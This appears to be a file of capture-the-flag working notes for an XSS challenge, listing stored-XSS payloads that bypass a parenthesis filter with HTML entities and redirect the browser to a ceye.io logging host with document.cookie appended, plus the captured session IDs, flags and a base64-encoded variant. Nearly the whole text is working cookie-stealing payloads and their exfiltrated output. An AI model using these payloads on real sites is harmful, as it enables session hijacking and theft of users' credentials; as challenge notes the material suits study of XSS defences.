@@ -1,0 +1,43 @@
+https://www.freebuf.com/articles/web/226719.html
+
+========DNS Log========
+http://ceye.io/records/http
+http://dnslog.cn/
+=======================
+<body/onpageshow=alert()>
+Bad words found: )
+
+<body/onpageshow=alert(&#41;>
+=======================
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+document.cookie">
+失败
+
+<body/onpageshow="var x = '1234';document.location='http://guui9d.ceye.io/'+x">
+成功
+
+=======================
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+document.cookie.substr(0,120&#41;">
+
+http://guui9d.ceye.io/PHPSESSID=0276nmm2gmbclgo0fk467jq1i1; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability <script>alert(1)</scr
+
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+document.cookie.substr(120,60&#41;">
+http://guui9d.ceye.io/ipt>}; FLAG_2=IN_THE_REDIS
+
+=======================
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+document.cookie.substr(0,125&#41;">
+失败
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+document.cookie.substr(0,124&#41;">
+失败
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+document.cookie.substr(0,123&#41;">
+成功
+http://guui9d.ceye.io/PHPSESSID=sh6ij5o0fl5dgm19a6g4j0f7q7; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability <script>alert(1)</script
+
+<body/onpageshow="document.location='http://guui9d.ceye.io/FLAG{aaascript>'">
+失败
+
+应该是admin 浏览器 对不符合规则的url，不跳转
+=======================
+<body/onpageshow="document.location='http://guui9d.ceye.io/'+btoa(document.cookie&#41;">
+http://guui9d.ceye.io/UEhQU0VTU0lEPWk1bzFwbGpvb2o2ajlsYzJqMWNldW81bG43OyBGTEFHX1hTU01FPUZMQUd7U29tZXRpbWVzLCBYU1MgY2FuIGJlIGNyaXRpY2FsIHZ1bG5lcmFiaWxpdHkgPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pn07IEZMQUdfMj1JTl9USEVfUkVESVM=
+PHPSESSID=i5o1pljooj6j9lc2j1ceuo5ln7; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability <script>alert(1)</script>}; FLAG_2=IN_THE_REDIS
+
